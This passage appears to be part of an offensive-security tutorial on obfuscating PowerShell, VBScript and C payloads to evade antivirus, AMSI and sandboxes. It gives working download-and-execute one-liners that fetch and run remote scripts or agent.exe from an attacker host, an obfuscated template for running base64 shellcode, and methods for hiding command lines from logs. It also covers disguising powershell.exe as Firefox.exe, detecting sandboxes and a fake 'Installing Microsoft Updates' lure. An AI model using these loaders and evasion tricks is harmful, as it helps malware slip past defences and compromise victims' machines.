      $syscall = $ScriptBlock.Replace("?","").Replace("'","").Replace("+","").Replace("%","")
      Get-CimInstance $syscall | Select-Object CSName, OSArchitecture, Caption, SystemDirectory | FL *

![powershell obfuscation](http://i64.tinypic.com/2la6dmu.jpg)

---

      [ RTLO ] Powershell cames with one buitin feature (::Reverse) that allow us to change the
      text alignment from left to rigth side (arabe alignment). That built in feature allow us
      to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at run-time.

<br />

- String command to obfuscate<br />
`powershell.exe Get-Date`

- String obfuscated<br />

      [ Using ::Reverse method ]
      $reverseCmd = "etaD.teG exe.llehsrewop"
      $reverseCmdCharArray = $reverseCmd.ToCharArray();[Array]::Reverse($reverseCmdCharArray);
      ($ReverseCmdCharArray-Join '') | IEX

      [ Using Regex method ]
      $reverseCmd = "etaD.teG exe.llehsrewop"
      IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX


![powershell obfuscation](http://i67.tinypic.com/2labt3d.jpg)

---

      [ -f reorder parameter ]
      Using -f (reorder) switch to re-order the strings in there correct order, the switch
      -f accepts strings separated by a comma, and the caret {} contains the string position
      after the -f switch.. HINT: we are going to replace another syscall by one splatting
      local variable to be called at execution time also (3 obfuscation technics used).

<br />

- String command to obfuscate<br />
`Get-Service` And `TeamViewer`

- String obfuscated<br />
`("{0}{2}{1}{3}" -f'vice','Ser','G','et-')` And `$first='Te'+'amV'+'iewer'`

![powershell obfuscation](http://i66.tinypic.com/21eublh.jpg)

      Stacking 're-order' commands together with the ; operator. Remmenber that we can also
     store the re-order method inside an local variable to be called at run-time.
      Example: $syscall = ("{3}{0}{2}{4}" -f'voke','es','-Expr','In','sion')

- String command to obfuscate<br />
`Invoke-Expression (New-Object)`

- String obfuscated<br />
`$a=("{3}{0}{2}{1}{4}" -f'voke','es','-Expr','In','sion') ; $r=("{0}{2}{1}" -f'(New','ject)','-Ob')`

![powershell obfuscation](http://i67.tinypic.com/1znx11e.jpg)
`HINT: we can also scramble the location of the vars ($a | $r) inside the sourcecode (order)`<br />
`to obfuscate it further, and then call them in the correct order executing the powershell command.`

---

      Another way to use 'splatting + reorder' technic to remote download/execute agent

- String command to obfuscate<br />
`IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.71/Hello.ps1")`

- String obfuscated<br />

      I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://')

![powershell obfuscation](http://i65.tinypic.com/2h55mb4.jpg)

---

      [ Additional Methods for exec base64 shellcode ]
      Since the powershell -enc method started to be used to execute base64 shellcode strings that it became
      very targeted by security suites to flag alerts, In order to circumvent -enc parameter we decided to
      use powershell commands and leverage set-variables with .value.toString() in order to piece together
      our -enc command into the command line. This allows us to specify -enc without ever calling -enc which
      would be hit by detection rules. [ ReL1k ]


<br />

- File **Unicorn.ps1** (base64 shellcode execution)

      $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "n"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell $syscall $flag $cert $pem (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"

![powershell obfuscation](http://i66.tinypic.com/kdabsh.png)

      HINT: I have re-written REL1K's template to accept -WiN hIdDEn -Ep bYpASS (reorder obfuscation)
      and change the powershell 'EncodingCommand' from -ec to -en (less used flag by pentesters).

---

      [ BitsTransfer - Additional Methods for Remote Download ]
      Another way to download/execute remotelly our agent without using the powershell switch
      (Net.WebClient).DownloadFile method. This method also allow us to chose the download
      location of the agent in target system and start the agent (exe).

      HINT: powershell gives us access to windows environment variables using the $env: switch

<br />

- File **test.ps1** (trigger download/execution)

      Import-Module BitsTransfer
      Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$env:tmp\\agent.exe"
      Invoke-Item "$env:tmp\\agent.exe" #<-- trigger agent execution

![powershell obfuscation test.ps1](http://i66.tinypic.com/23u8ua8.jpg)

- Execution of **agent.exe** in target system (auto-exec)

![powershell obfuscation msfconsole](http://i63.tinypic.com/2lo6a9e.jpg)

---

      [ Invoke-WebRequest - Additional Methods for Remote Download ]
      This method 'Invoke-WebRequest' working together with 'OutFile' and 'File'  powershell parameters
      allow us to remote download (full path can be inputed into sourcecode string) and execute our script.

      HINT: If you wish to download/execute an binary.exe, then replace the -File by Invoke-Item parameter
      HINT: To upload to another location use $env: powershell var (eg. -OutFile "$env:tmp\\Invoke-Hello.ps1")
      HINT: In this example was not used the -win hidden switch that allow us to hidde the powershell windows
      HINT: Delete -PassThru from the sourcecode to NOT display the download traffic in target terminal, that
      parameter was left behind for article readers to see the download connection taking place ..


<br />

- File **Invoke-WebRequest.ps1** (trigger download/execution)

      Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "hello.ps1" -PassThru; Start-Sleep 1; powershell.exe -File hello.ps1

![powershell Additional Methods for Remote Download](http://i63.tinypic.com/2mpx7wl.jpg)

---

      [ COM-downloaders - Additional Methods for Remote Download ]
      The follow oneliner's are also downloaders using diferent COM objects like 'WinHttp' or 'Msxml2'
      HINT: The follow downloaders will not drop the agent on disk (download/exec in ram)

<br />

      $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText

      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText

      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.1.71:8080/hello.ps1');

![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)

---

      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
      the agent.ps1 dosen't contain any real malicious syscall's to be scan/flagged. 

<br />

- String command to obfuscate<br />
`Date`

- using powershell to decode base64 syscall


      1º - encode the command you want to obfuscate (linux-terminal)
      echo "Date" | base64

      2º - copy the encoded string to paste it on your script
      RGF0ZQo=

      3º - Insert the follow lines into your powershell script

        $Certificate="RGF0ZQo="
        $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Certificate))
        powershell.exe Get-$decoded   #<-- execute/decode the base64 syscall at runtime

![powershell obfuscation](http://i64.tinypic.com/2cyfeck.jpg)

Here we can view the all process of encoding/decoding in powershell console
![powershell obfuscation](http://i65.tinypic.com/6xqett.jpg)

---

- More obscure obfuscated/bypass technics<br />

      If the proccess name is 'powershell' and the command line arguments match some specific
      patterns, AMSI/AV's will flag that input as malicious. there are 3 main ways to bypass it:

<br />

     1º - Obfuscate the name of the powershell binary in target system before execute any
          powershell commands. This can be achieved by making a copy of powershell.exe and
          rename it to Firefox.exe using an agent.bat before further ahead call the obfuscated
          powershell binary (Firefox.exe) to execute our powershell command line arguments.

      Copy-Item "$env:windir\System32\Windowspowershell\v1.0\powershell.exe" -Destination "$env:tmp\Firefox.exe"
      cd $env:tmp; .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..

![powershell rename](http://i63.tinypic.com/k0rhnt.jpg)

[Binary ofuscation technic applied to Bypass-AMSI.ps1 with Bypass/download/exec abilities](https://pastebin.com/A2C0TSNs)<br />

<br />

     2º - Unlink the command-line arguments from the code they deliver, one example of that its
          the ability of powershell to consume commands from the standart input stream ( pipe | )
          When viewed in the event log, the arguments to powershell.exe are no longer visible.

      cmd.exe /c "echo Get-ExecutionPolicy -List" | powershell.exe
      cmd.exe /c "set var=Get-ExecutionPolicy -List&& cmd.exe /c echo %var%^" | powershell.exe

![powershell rename](http://i67.tinypic.com/in8keu.jpg)

<br />

      3º - obfuscating powershell statements (IEX | Invoke-Expression | etc)
           obfuscating this kind of 'calls' are not has easy like most powershell variables
           declarations are, If we try to set any variable pointing to one powershell statement
           then the interpreter will fail to descompress the variable into an command. The next
           two screenshots shows how it fails if we try to use the conventional way, and how to
           bypass it using the Invoke-Command statement that has the ability to transform inputs
           into 'strings' that can deal with that limitation, allowing us to call the statement
           IEX previous stored inside a local powershell variable .. 
           
      [The conventional way]
      $obf="iex"
      $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
      powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
      Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')

![var declaration fail](http://i66.tinypic.com/6jn238.jpg)

      [Using Invoke-Command statement wrapped in double quotes]
      powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"

![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)

---

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
[3] [All Hail to ''@danielbohannon'' for its extraordinary work (obfuscation) under powershell](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />

---


<br /><br /><br /><br />

## VBScript Obfuscation Technics (vba-vbs)

      [Reverse a string] The StrReverse() vbscript funtion can be used to reverse a string.
      This funtion allow us to obfuscate the systemcall(s) by reversing the string(s) at runtime.

<br />

- String command to obfuscate<br />
`How To Reverse a String In Vbs`

- String obfuscated (test.vbs)<br />
`Wscript.echo StrReverse("sbV nI gnirtS a esreveR oT woH")`
![vbscript obfuscation](https://i.cubeupload.com/gWZlXY.jpg)

- Ofuscating [ function names ] using lowercase and uppercase characters<br />
![vbscript obfuscation](https://i.cubeupload.com/I61iVL.png)

- Obfuscating [ string ] using concaternation (vba accepts [ +  and & ] operators to stack string)<br />
![vbscript obfuscation](https://i.cubeupload.com/JrJBVS.png)

- Using concaternation and variable substitution<br />
![vbscript obfuscation](http://i.cubeupload.com/qJ7Xbn.png)

---

      [Executing a reverse string] The follow example creates the objshell and objShell.Run Objects
      to be able to execute commands, it also defines a local variable (dim rev) with the strReverse()
      builtin API that reverses the string (netstat systemcall) at runtime execution.

<br />

- String command to obfuscate<br />
`netstat`

- String obfuscated (test.vbs)<br />

      Dim rev
      rev = StrReverse("tatsten")
      set objshell = Createobject("Wscript.Shell")
      objShell.Run rev

![vbscript obfuscation](http://i.cubeupload.com/IHL5Nf.png)

---

      [caret escape character obfuscation] In this example the vba script its executing cmd commands.
      Remmenber that the cmd.exe interpreter uses the [ ^ ] caret as escape caracter, that allow us to
      abuse of batch obfuscation technics after the cmd.exe beeing trigger by the vba sourcecode. The
      follow example also splits the command into 2 var(s) [ rev + cmd ] and join them at runtime exec.

<br />

- String command to obfuscate<br />
`cmd.exe /c start calc`

- String obfuscated (test.vbs)<br />

      Dim rev
      Dim cmd
      rev = StrReverse("clac trats c/")
      cmd = "cMd.Exe ^B^U^F^F^E^R" & rev
      set objshell = CreateObject("Wscript.Shell")
      objShell.Run cmd

![vbscript obfuscation](http://i.cubeupload.com/6UqdZD.png)

- Obfuscating further the string inside StrReverse() object<br />
`rev = StrReverse("cl^ac ^ ^ tr^at^s R/^")`<br />

![vbscript obfuscation](http://i.cubeupload.com/yY02QY.png)<br />

- Obfuscating further the string using the [ + ] operator (concaternation)<br />
`rev = StrReverse("cl^ac "+" ^ "+" ^ tr^a"+"t^s R/^")`<br />

![vbscript obfuscation](http://i.cubeupload.com/1FViJX.png)<br />

      [Ofuscating Function Names] Function names or variable declarations can be further obfuscated
      be replacing human-readable names by a random string of characters, helping this way to throw
      more confusion to sourcecode and fool signature detection analysis based in certain patterns. 
 
<br />

![vbscript obfuscation](https://i.cubeupload.com/ZOoE5w.png)

- Obfuscating method names [lowercase and uppercase] and start of cmd functions with [ batch ] special chars<br />

![vbscript obfuscation](https://i.cubeupload.com/vycfL0.png)

- Build Oneliner (test.vbs)<br />

      [Build oneliner] VBScript uses the [ : ] character as end of command the same way bash and python
      uses the [ ; ] character to execute another command, this technic can be used to build our vbs oneliner.

![vbscript obfuscation](https://i.cubeupload.com/XWtrCW.png)

---

      [replace vbscript API] In this example the special character [ @ ] its deleted from the txt var string
      using wscript (Replace(txt,"@","")) builtin API together with [ objShell.Run ] method at runtime exec. 

<br />

- String command to obfuscate<br />
`cmd.exe /c start calc`

- String obfuscated (test.vbs)<br />

      Dim txt
      txt = "@cM@d.@ex@e @ /@R s@tar@t @cal@c"
      set objshell = CreateObject("Wscript.Shell")
      objShell.Run(Replace(txt,"@",""))

![vbscript obfuscation](http://i.cubeupload.com/MtGs1y.png)

-  Build oneliner [ : ] and Obfuscate further the string using [ + ] and [ ^ ] operators (concaternation)<br />

![vbscript obfuscation](http://i.cubeupload.com/oW4Kvd.png)

- Replace the two first occurrencies of [ # ] character by [ i ] character<br />

      Dim txt
      txt = "Replac#ng the 2 first occurrenc#es of # character by i character!"
      Wscript.echo(Replace(txt,"#","i",1,2))

![vbscript obfuscation](http://i.cubeupload.com/VIyvEC.png)

- Another way to Replace [ UI$z ] string by [ t ] character at runtime<br /> 

      Dim ser
      ser = Replace("neUI$zsUI$zaUI$z -UI$z", "UI$z", "t")
      set objShell = CreateObject("Wscript.Shell")
      objShell.Run(ser)

![vbscript obfuscation](https://i.cubeupload.com/2JHct1.png)

      [Replacing two characters] In the follow example we are obfuscating variable declarations
      names + vba function names using lowercase and uppercase characters, and using the Replace()
      vbs function to replace inside the string the chars [ UI$z -> e ] and [ 0!b -> P]

      The 1º Replace() function will store the string substitution of [ e ] character into sEr
      variable declaration, the 2º Replace() function its then used by the Wscript.echo() function
      to replace the [ P ] chars before executing the de-obfuscated syscall.

<br />

- String command to obfuscate<br />
`Powershell.exe -noP -eNc shellcode: \x0e\x0a\xeP`

- String obfuscated (test.vbs)<br />

      diM sEr
      sEr = rEpLaCe("0!bowUI$zrshUI$zll.UI$z -no0!b -UI$zNc shUI$zllcodUI$z: \x0UI$z\x0a\xUI$z0!b", "UI$z", "e")
      wScRipt.eChO(rEPlacE(sEr, "0!b", "P"))

![vbscript obfuscation](https://i.cubeupload.com/0Pxw9I.png)

- Replacing four (4) diferent characters on the obfuscated string [ e | P | o | s ]<br />

![vbscript obfuscation](http://i.cubeupload.com/RkBwqE.png)

- Build oneliner (test.vbs)<br />

![vbscript obfuscation](http://i.cubeupload.com/gcSLVS.png)

---

      [ANCII character substitution] vbscript calls ancii characters using the Chr() API.
      This substitution method can be used to obfuscated our systemcall(s) by composing the
      final command at runtime, this technic uses the [ & ] operator to stack characters

<br />

- String command to obfuscate<br />
`WHOAMI`

- String obfuscated (test.vbs)<br />

      Wscript.echo Chr(87) & Chr(72) & Chr(79) & Chr(65) & Chr(77) & Chr(73)

![vbscript obfuscation](http://i.cubeupload.com/lCC4M4.png)

- Stacking characters together using [ + ] operator<br />

      Wscript.echo Chr(87)+Chr(72)+Chr(79)+Chr(65)+Chr(77)+Chr(73)

![vbscript obfuscation](http://i.cubeupload.com/OhKC5l.png)

- ANCII and VBScript var substitution using [ Chr() ] and [ + void + ] and [ + ] to stack<br />

      Dim void
      void = "o"+""
      Wscript.echo Chr(87)+Chr(72)+Chr(79)+Chr(65)+Chr(77)+Chr(73)+Chr(63)+"Iam Gr" + void + void + "t offc" + void + "urse.."

![vbscript obfuscation](http://i.cubeupload.com/LgdMJY.png)

- Build Oneliner: Executing ANCII character substitution (test.vbs)<br />
`cmd.exe /c start calc`<br />

![vbscript obfuscation](http://i.cubeupload.com/WiXBCu.png)

[We can see the full list of ANCII characters here:](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ASCII-list.md)<br />

---

      [Join builtin API] using VBScript Join API to join the systemcall(s) together at runtime
      The string its concaternated inside MyArray variable declaration and Join together inside
      stack var, then the two var(s) are 'stack' and stored inside a new var named final to be
      called at runtime.

<br />

- String command to obfuscate<br />
`cmd.exe /c start calc`

- String obfuscated (test.vbs)<br />

      Dim MyArray
      Dim stack
      MyArray = array("c","a","l","c")
      stack = Join(MyArray,"")
      final = "cmd.exe /c start " & stack
      set objshell = CreateObject("Wscript.Shell")
      objShell.Run final

![vbscript obfuscation](https://i.cubeupload.com/w0YIHX.png)

- Further obfuscation [ var substitution, random function names, ancii substitution, caret obfuscation, concaternation ]<br />

![vbscript obfuscation](http://i.cubeupload.com/7oPCYh.png)

---

      [ Using environment variables + Len() ] The follow example show how to extract the string
      'Temp' from target %tmp% environment variable full path, store it into 'splash' vba variable
      declaration and use (Len(pass) -29) funtion to delete the first 29 chars from the string.

<br />

- String command to obfuscate<br />
`Temp`

- String obfuscated (test.vbs)<br />

      Dim pass
      Dim splash
      pass = CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%tmp%")
      splash = Rigth(pass, Len(pass) -29)
      Wscript.echo("Extracting '" + splash + "' chars from: '" + pass + "' env")

![vbscript obfuscation](http://i.cubeupload.com/IncZR1.png)

---

      Using [ Mid ] vba API to extract a sub-string from the [ middle ] of the main string.

<br />

- String command to obfuscate<br />
`pedro`

- String obfuscated (test.vbs)<br />

      Dim pass
      Dim splash
      pass = CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%tmp%")
      splash = Mid(pass, 10, 5)
      Wscript.echo("Extracting '" + splash + "' chars from: '" + pass + "' env")

![vbscript obfuscation](http://i.cubeupload.com/kyDnDW.png)

- Further Obfuscation in function and method names and strings concaternation [ + extract 2 strings ]<br />

![vbscript obfuscation](https://i.cubeupload.com/aNP9w4.png)

- Build Oneliner using [ : ] operator (test.vbs)<br />

![vbscript obfuscation](http://i.cubeupload.com/qHGcuz.png)

---

                         OBSCURE FUNTIONS [ ARITHMETIC SEQUENCES + SANDBOX EMULATION CHECKS ]

                  Extract [ Cmd /c start calc ] from target %tmp% variable string using Mid() VBA API.

<br />

- String command to obfuscate<br />
`Cmd /c start calc `

- String obfuscated (test.vbs)<br />

![vbscript obfuscation](http://i.cubeupload.com/oQs8qp.png)

---

      [Arithmetic Sequences] When it comes to hard-coded numeric values, obfuscators may employ simple
      arithmetic to thwart reverse engineers or to stall malicious code execution to bypass sandbox.

<br />

- Arithmetic funtion<br />

      UikEt = "201"+"8"
      If UikEt < 0 Then:MsgBox "Obscure funtion that never gets executed":End If

      HINT: 2018 its allways BIGGER than 0 (so this funtion will never execute)

![vbscript obfuscation](http://i.cubeupload.com/o7Sfza.png)<br />

---

      [sandbox emulation checks] This next exercise will check target %userdomain% value to determine
      if script its running in a sandbox environement (AMSI scan) by comparing sandbox common hostnames
      like: sandbox, Maltest, ClonePC, etc .. the If statatment will Exit (Wscript.Quit) script execution
      if detected sandbox or resume script execution if not running inside a sandbox environement ..

<br />

- hostname check funtion<br />

      Dim x0a
      x0a = CreateObject("Wscript.Shell").ExpandEnvironmenSTrings("%USERDOMAIN%")

      If (x0a = "sandbox" OR x0a = "Maltest" OR x0a = "ClonePC") Then
      MsgBox "Sandbox emulation running in: " & x0a & Wscript.Quit
      else
      MsgBox "None sandbox emulation running in: " & x0a
      End If

![vbscript obfuscation](http://i.cubeupload.com/Mm2KpZ.png)

- Obfuscation technics in string manipulation can be stack together using [ + ] or [ & ] operators<br />

![vbscript obfuscation](http://i.cubeupload.com/wE0lXo.png)

---

      Diferent method to use the [ Mid() ] funtion without expanding the target environement var(s).
      In this example we will store all the letters needed to build our command inside [ String1 ]
      HINT: we can use only 2 vba var(s) to achive this: [ String1 and String2 ] and call [ String2 ]

<br />

- String command to obfuscate<br />
`PoWeRshell.exe -noP -enC \x0a\x0d\xff`

![vbscript obfuscation](http://i64.tinypic.com/o714c3.jpg)

- Build oneliner using [ : ] character and deleting empty spaces in between commands<br />

![vbscript obfuscation](http://i.cubeupload.com/igdIAl.png)

[*] [Here we can find this template modified to trigger shellcode base64 execution](https://pastebin.com/cxfyQfwT)
      
---

      [AMSI Bypass - behavioral monitoring] this technic uses behavioral monitoring to detect human
      interaction on the computer before malware executes. Random activities such as page scrolling,
      mouse movement or [ mouse clicks ] are difficult to replicate by a virtual environment,that
      gap in sandboxing can be exploited writing a funtion to stall code exec (human interaction).

<br />

- Behavioral Monitoring Funtion [ mouse click ]<br />
`MsgBox"Installing Microsoft Updates .."`

![vbscript obfuscation](https://i.cubeupload.com/AzNqlj.png)

---

      [less Mid() statements] AV vendors sometimes uses regex search to find repetitive patterns that
      may reveal malicious actions. In this example we are reducing the number of mid() calls either
      to evade regex repetitive search or to maintain our code smaller (if nedded)..

      In the follow example we are 'stacking' groups of letters insted of extracting one char at the time.

<br />

- String command to obfuscate<br />
`powershell -win 1 -nop -en \x0a\x0d\xff`

- String obfuscated (test.vbs)<br />

      dIm Char,Cmd
      Char="-wIN"+"eN"+"PoWeR"+"1"+"noP"+"ShElL"
      Cmd=mid(Char,7,5)&MiD(Char,16,5)&" "&mId(Char,1,4)&" 1 "&mId(Char,1,1)&MiD(Char,13,3)&" "&mId(Char,1,1)&mId(Char,5,2)&" "&"\x0a\x0d\xff"
      Wscript.echo Cmd

![vbscript obfuscation](http://i.cubeupload.com/4RbjC8.png)

---

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## C Obfuscation Technics (c-exe)

      [WARNING]: In the follow examples (template.c) its going to be compiled into an LINUX executable program
      with the help of GCC (Gnu-Cross-Compiler) to demonstrate obfuscation technics discussed in this chapter.
      "Its more easy for me to write the article, take screenshots and execute agent in the same machine (PC)"

![C obfuscation](http://i65.tinypic.com/11kjeqh.png)

      HINT: #include <string.h>  library its required for the C program to use string manipulations.
      HINT: #include <windows.h> into template.c if you wish to transform it into an M$ executable (mingw32)
      compile to windows systems (x86): i586-mingw32msvc-gcc template.c -o finalname.exe -lws2_32 -mwindows
      compile to windows systems (x64): i686-w64-mingw32-gcc template.c -o finalname.exe -lws2_32 -mwindows

<br /><br />

---

      [trigraphs] Trigraph sequences allow C programs to be written using only the ISO
      (International Standards Organization) Invariant Code Set. Trigraphs are sequences of three
      characters (introduced by two consecutive question marks) that the compiler replaces with
      their corresponding punctuation characters.

![C obfuscation](http://i66.tinypic.com/2eoeg7r.png)

<br />

- String command to obfuscate<br />
`{` **and** `}` **and** `\`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

      int main()
        ??<
          printf("trigraphs obfuscation??/n");
        ??>

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack -trigraphs template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/2mr7gg9.png)

      WARNING: IF your template contains trigraphs substitution method then -trigraphs
      switch its required in gcc syntax to be abble to compile the substitution technic`

---

<br />

      [Digraphs] Unlike trigraphs, digraphs are handled during tokenization, and any digraph must
      always represent a full token by itself, or compose the token %:%: replacing the preprocessor
      concatenation token ##. If a digraph sequence occurs inside another token, for example a quoted
      string, or a character constant, it will not be replaced.

![C obfuscation](http://i64.tinypic.com/j5l3mf.jpg)

<br />

![C obfuscation](http://i67.tinypic.com/34sqtdc.png)
`HINT: digraphs does not require any special GCC switch to be compiled unlike trigraphs`

---

      [horizontal tab character] This technic allow us to add a 'space(horizontal tab)'
      into string at runtime, and it can be used for string obfuscation proposes ..

<br />

- String command to obfuscate<br />
`pOwErShElL /wIN 1 /noP /Enc`

- String obfuscated (template.c)<br />

      #include <stdio.h>

        int main()
          {
            /* Here we are using \t, which is a horizontal tab character. */
            /* It will provide a tab space between two words. */
            char str[] = "pOwErShElL\t/wIN\t1\t/noP\t/Enc";
            printf("token[0]: pOwErShElL\\t/wIN\\t1\\t/noP\\t/Enc\\n\n");
            printf("token[1]: %s\n", str);
            return (0);
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i64.tinypic.com/s49zsi.png)

---

      [ANCII char substitution] The C library function int putchar(int char) writes a
      character (an unsigned char) specified by the argument char to stdout.

      The program specifies the reading length's maximum value at 1000 characters.
      It will stop reading either after reading 1000 characters or after reading in
      an end-of-file indicator, whichever comes first.

<br />

- String command to obfuscate<br />
`CmD.exe /R start calc`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            char y = 67;   // ancii character C
            char x = 109;  // ancii character m
            char w = 68;   // ancii character D

            // putchar() funtion its then used to convert the decimal(67)
            // value of var 'y' by is comrrespondent ancii character(C).
            putchar(y);putchar(x);putchar(w);printf(".exe /R start calc\n");
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/2lub386.png)

      Using arithmetic operators to add or substract a number into final var declaration.
      This technic can be used to throw more confusion into the sourcecode (obfuscation).
      SYNTAX EXAMPLE: char y = 66+1;   // ancii character C (char67)

![C obfuscation](http://i63.tinypic.com/25z1baw.png)

[!] [review the full ANCII table here:](https://www.asciitable.com/)<br />

---

      [strcat()] In the follow example the attacker 'splits' the string powershell into 
      two char variables and use strcat() funtion to concaternate (join) the two sub-strings
      together at run time execution..
      

<br />

- String command to obfuscate<br />
`PoWeRShElL`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main ()
          {
            /* variable declations*/
            char str1[12] = "PoWeR";
            char str2[12] = "ShElL";

            /* concatenates str1 and str2 */
            strcat(str1,str2);
            printf("Concaternate 'PoWeR' + 'ShElL' using strcat(): %s\n", str1 );
            return 0;
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i68.tinypic.com/1zd3gpv.jpg)

---

      [strncat] The strncat( ) function in C language concatenates (appends) portion of one
      string at the end of another string. WARNING: remenber that each string in C is ended
      up with the null character ('\0') so we must take that into account and sum one more
      number to the strncat delimiter (if you want to print 4 chars then add the 5 delimiters)

      Example :
      strncat(target, source, 6); -> First 6 chars of source[] is concatenated at the end of target[]
      HINT: Remmener that var source[] as a empty space in the begging of the string that must be
      counted as delimiter. char souce[] = " -noP" + return carrier (\0) == 6 tokens == " -nop\0"
                                                    --  char source[] token delimiters = 12345 6

<br />

- String command to obfuscate<br />
`PoWeRShElL -noP`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            char source[ ] = " -noProblem";
            char target[ ] = "PoWeRShElL";
            strncat (target, source, 6 );
            printf("String after strncat(): %s\n", target);
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i64.tinypic.com/2610m51.png)

---

      [strncpy()] function copies portion of contents of one string into another string.
      EXAMPLE: strncpy (comma, string, 10 ); – It copies first 10 chars of string[] into comma[]

      If destination string length is less than source string, entire source string value won’t
      be copied into destination string. For example, consider destination string length is 20
      and source string length is 30. If you want to copy 25 characters from source string using
      strncpy() function, only 20 characters from source string will be copied into destination
      string and remaining 5 characters won’t be copied and will be truncated.

<br />

- String command to obfuscate<br />
`PoWeRShElL`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            char string[ ] = "pOwErShElLrUbIsH";
            char comma[20] = "";
            strncpy (comma, string, 10 );
            printf("String after strncpy(): %s\n", comma );
            return 0;
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/2gt5aaw.png)

---

      [executing a shell command] In the follow example we will demonstrate how to use the system()
      funtion to be abble to execute shell (bash) commands using C language. HINT: system() funtion
      will execute system commands, in linux distos it uses the bash interpreter, in windows distros
      uses the batch interpreter, etc, etc, etc..

<br />

- String command to obfuscate<br />
`uname -a`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            // system() funtion variable declaration
            int system(const char *command);
            // executing system() shell funtion (bash)
            system("uname -a");
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i63.tinypic.com/bhakuw.png)

      Assigning the 'bash command' into one C variable to be called in system() funtion
      This will allow us to use further string manipulation technics sutch as concaternation
      in variable declarations further obfuscating the sourcecode.

<br />

- String command to obfuscate<br />
`uname -a`

- String obfuscated (template.c - another example)<br />

      #include <stdio.h>
      #include <string.h>

        int main()
          {
            // system() funtion variable declaration
            char command[] = "uname -a";
            int system(const char *command);
            // executing system() shell funtion (bash)
            system(command);
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i64.tinypic.com/w88fpy.png)

---

      [memset()] memset() is used to fill a block of memory with a particular value.
      Example: (str + 1)  points to the first character of the string 'GiDks' (letter G) the next argument
      of memset() sets that the replacement character will be the letter (e) and the final argument will
      replace in str[] 2 chars counting from the 1º char found.. (letter iD will be replaced by letters ee)

      SYNTAX: memset(str + 1, 'e', 2*sizeof(char));

<br />

- String command to obfuscate<br />
`Geeks`

- String obfuscated (template.c)<br />

      #include <stdio.h>
      #include <string.h>
 
        int main()
          {
            char str[] = "GiDks";
            printf("Before memset(): %s\n", str);

            // Substitute the token after the 1º char of str[] by the letter 'e'
            // 2*sizeof(char) indicates that two chars are beeing replaced in str[]
            memset(str + 1, 'e', 2*sizeof(char));

            printf("After  memset(): %s\n", str);
            return 0;
          }

- Compiling template.c<br />
`gcc -fno-stack-protector -z execstack template.c -o finalname`

![C obfuscation](http://i66.tinypic.com/2i74fbr.png)

- Replace two chars in str[] by another two chars and delete the last char of str[]<br />

![C obfuscation](http://i68.tinypic.com/2hehtg0.png)

- Replace 5 chars in str[]<br />

![C obfuscation](http://i68.tinypic.com/2j5l2s0.png)

- Executing obfuscated nmap command (digraphs+trigraphs+delspaces+memset+system)<br />

![C obfuscation](http://i63.tinypic.com/jpx3qx.png)
